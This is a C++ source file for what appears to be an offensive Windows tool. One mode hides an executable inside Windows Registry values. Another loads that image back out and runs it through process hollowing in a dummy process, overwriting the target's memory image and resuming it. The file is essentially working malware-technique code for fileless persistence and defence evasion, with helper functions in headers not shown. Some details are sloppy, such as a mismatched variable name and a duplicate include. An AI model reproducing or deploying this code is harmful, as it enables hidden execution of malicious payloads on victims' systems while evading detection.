#include <iostream>
#include <fstream>
#include "PE.h"
#include "GetInfo.h"
#include "PE.h"
#include "RegHide.h"
#include "globals.h"
#pragma once
#define CONFIG_FILE_PATH "./config.ini"

using namespace std;
#ifdef _WIN64
bool is64bit = true;
#else
bool is64bit = false;
#endif

// CONFIG VALUES FOR REGHIDE
std::string strConfigPathToSourceFile;

// CONFIG VALUES FOR PROCESS HOLLWING
std::string strConfigPathToDummyProcessFile;

// UNIVERSAL CONFIG VALUES
std::string strConfigRegKeyName;
std::string strConfigValuePrefix;
std::string hConfigGlobalHkey;
std::string strSrcPath = strConfigPathToSourceFile.c_str();

int PInject(NewPEInfo& srcPEInfo, LPCSTR strDestPath)
{
	// GET DEST PE INFO
	NewPEInfo destPEInfo = StorePEInMemory(PEInputMode::FromFile, strDestPath, NULL, NULL, NULL, NULL);
	if (!destPEInfo.pFileData)
	{
		return false;
	}

	//Check Bitness compatability
	auto srcArch = getArch(srcPEInfo);
	auto destArch = getArch(destPEInfo);
	if (srcArch != destArch)
	{
		printf("Bitness Mismatched!\n\tSource PE: %s\n\tDestination PE: %s\n", srcArch.c_str(), destArch.c_str());
		return false;
	}

	//Check current injection scenario, 64-64 or 32-32
	//bool is64Bit = true;
	if (srcArch == "x64 (64-bit)" && destArch == "x64 (64-bit)")
	{
		printf("Current injection scenario: 64 -> 64\n");
	}
	else if (srcArch == "x86 (32-bit)" && destArch == "x86 (32-bit)")
	{
		printf("Current injection scenario: 32 -> 32\n");
		is64Bit = false;
	}
	else
	{
		printf("Current injection scenario is not supported, exiting \n");
		return false;
	}

	//Check source PE is smaller than destination PE
	auto SrcImageSize = GetImageSize(srcPEInfo);
	auto DestImageSize = GetImageSize(destPEInfo);
	if (SrcImageSize > DestImageSize)
	{
		printf("Source Image is larger than Destination Image\n\tSource Image: %zu\n\tDestination Image: %zu\n", SrcImageSize, DestImageSize);
		return false;
	}
	// GET DUMMY PROCESS INFO
	PROCESS_INFORMATION destProcessInfo = GetDestProcessInfo(strDestPath);
	// GET DESTINATION PROCESS' PEB
	PEB destProcessPeb = GetPEBExternal(destProcessInfo.hProcess);

	//GET STARTING ADDRESS OF DESTINATION PROCESS
	PVOID destImageBase = destProcessPeb.ImageBaseAddress;

	// INJECT SOURCE PROCESS INTO DESTINATION PROCESS
	auto processInfo = OverwriteProcess(srcPEInfo, destProcessInfo, destImageBase, DestImageSize);


	// RESUME THE NOW ZOMBIE PROCESS. BRAAAIIIIIIIIIIINZZZZ
	ResumeDestProcess(srcPEInfo, processInfo, destImageBase);

	return true;
}

int main()
{
	std::ifstream in(CONFIG_FILE_PATH);
	if (!in.is_open())
	{
		printf("Cannot open configuration file from %s", CONFIG_FILE_PATH);
		return false;
	}

	std::string config_param;
	std::string config_value;

	while (!in.eof())
	{
		in >> config_param;
		in >> config_value;

		if (config_param == "SOURCE_FILE_PATH")
		{
			strConfigPathToSourceFile = config_value;
		}
		else if (config_param == "DUMMY_PROCESS_FILE_PATH")
		{
			strConfigPathToDummyProcessFile = config_value;
		}
		else if (config_param == "GLOBAL_HKEY")
		{
			hConfigGlobalHkey = config_value;
		}
		else if (config_param == "REGISTRY_KEY_NAME")
		{
			strConfigRegKeyName = config_value;
		}
		else if (config_param == "REGISTRY_VALUE_PREFIX")
		{
			strConfigValuePrefix = config_value;

		}
	}
	in.close();
	char UserInput;
	const char* strPathToSourceFile = strConfigPathToSourceFile.c_str();
	LPCSTR strPathToDummyProcess = strConfigPathToDummyProcessFile.c_str();
	const char* strRegKeyName = strConfigRegKeyName.c_str();
	const char* strValuePrefix = strConfigValuePrefix.c_str();
	HKEY hGlobalHkey = NULL;

	if (hConfigGlobalHkey == "HKEY_CLASSES_ROOT")
	{
		hGlobalHkey = HKEY_CLASSES_ROOT;
	}
	else if (hConfigGlobalHkey == "HKEY_CURRENT_USER")
	{
		hGlobalHkey = HKEY_CURRENT_USER;
	}
	else if (hConfigGlobalHkey == "HKEY_LOCAL_MACHINE")
	{
		hGlobalHkey = HKEY_LOCAL_MACHINE;
	}
	else if (hConfigGlobalHkey == "HKEY_USERS")
	{
		hGlobalHkey = HKEY_USERS;
	}
	else if (hConfigGlobalHkey == "HKEY_CURRENT_CONFIG")
	{
		hGlobalHkey = HKEY_CURRENT_CONFIG;
	}
	else
	{
		cout << "Check GLOBAL_HKEY value in config.ini, only support HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS or HKEY_CURRENT_CONFIG";
		exit(-1);
	}

	cout << "Enter 'w' to run RegHide(Hide an executable in Windows Registry)\nEnter 'e' to run PHollow(Process Hollow & execute PE image in Windows Registry\nInput: ";
	cin >> UserInput;
	switch (UserInput)
	{
	case 'w':
	{
		printf("\nHiding %s into windows registry\n", strConfigPathToSourceFile.c_str());
		printf("\nUsing the following arguments\nGlobal HKEY: %s\nRegistry Key: %s\nRegistry Value Prefix: %s\n\n\n", \
			hConfigGlobalHkey.c_str(), strConfigRegKeyName.c_str(), strConfigValuePrefix.c_str());

		RegHide(strPathToSourceFile, hGlobalHkey, strRegKeyName, strValuePrefix);
		cout << "Successfully written the source file to Windows Registry.\nCheck regedit!\nDon't forget to delete the key when you are done!\n";
		break;
	}

	case 'e':
	{
		printf("\nInjecting payload into %s\n", strConfigPathToDummyProcessFile.c_str());
		printf("\nUsing the following arguments\nGlobal HKEY: %s\nRegistry Key: %s\nRegistry Value Prefix: %s\n\n\n", \
			hConfigGlobalHkey.c_str(), strConfigRegKeyName.c_str(), strConfigValuePrefix.c_str());

		NewPEInfo srcPEInfo = StorePEInMemory(PEInputMode::FromRegistry, nullptr, strRegKeyName, strValuePrefix);
		PInject(srcPEInfo, strPathToDummyProcess);
		printf("\nSuccessfully executed the payload, check your taskbar!\n");
		break;
	}
	case 'x':
	{
		printf("\nStandard overwriting %s\n", strConfigPathToDummyProcessFile.c_str());
		std::string strSrcPath = "C:\\users\\zeus\\desktop\\hello.exe";

		NewPEInfo srcPEInfo = StorePEInMemory(PEInputMode::FromFile, (LPCSTR)strSrcPath.c_str());
		PInject(srcPEInfo, strPathToDummyProcess);
		printf("\nSuccessfully executed the payload, check your taskbar!\n");
		break;
	}


	default:
	{
		fprintf(stderr, "Unrecognized option. Must be w or e or x.\n");
		exit(-1);
	}

	}

	system("pause");
	exit(-1);

}
